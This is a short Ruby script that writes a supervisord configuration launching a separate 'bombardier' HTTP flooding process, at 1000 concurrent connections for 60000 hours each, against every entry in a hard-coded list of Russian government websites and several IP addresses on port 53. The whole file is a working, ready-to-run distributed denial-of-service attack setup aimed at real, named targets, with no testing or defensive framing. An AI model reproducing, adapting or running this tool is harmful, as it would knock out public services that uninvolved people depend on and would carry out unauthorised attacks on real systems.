require 'yaml'

resources = [
  'http://kremlin.ru',
  'http://duma.gov.ru/',
  'http://president-sovet.ru/',
  'https://sovetnational.ru/',
  'https://www.gosuslugi.ru/ru/',
  'https://zakupki.gov.ru/epz/main/public/home.html',
  'https://gossluzhba.gov.ru/',
  'http://defence.council.gov.ru/',
  'http://budget.council.gov.ru/',
  'http://www.kremlin.ru/',
  'https://government.ru/',
  'http://www.scrf.gov.ru/',
  'http://www.ksrf.ru/ru/Pages/default.aspx',
  'http://www.vsrf.ru/',
  'http://premier.gov.ru/events/',
  'https://www.mchs.gov.ru/',
  'https://minjust.gov.ru/ru/',
  'http://www.fsb.ru/',
  'https://rosguard.gov.ru/',
  'https://customs.gov.ru/',
  'https://udprf.ru/',
  'http://favt.gov.ru/',
  'http://194.67.2.109:53/UDP',
  'http://194.67.7.1:53/UDP',
  'http://194.54.14.187:53/UDP',
  'http://194.54.14.186:53/UDP'
]


File.open('./supervisord.conf', 'w') do |f|
  f.write "[supervisord]\n"
  f.write "nodaemon=true\n"
  f.write "\n"

  resources.each_with_index do |website, i|
    f.write "[program:bombardier-#{i}]\n"
    f.write "command=bombardier -c 1000 -d 60000h --http1 -l #{website}\n"
    f.write "user=nobody\n"
    f.write "autostart=true\n"
    f.write "startsecs=0\n"
    f.write "stdout_logfile=/dev/stdout\n"
    f.write "stdout_logfile_maxbytes=0\n"
    f.write "stderr_logfile=/dev/stderr\n"
    f.write "stderr_logfile_maxbytes=0\n"
    f.write "\n"
  end
end
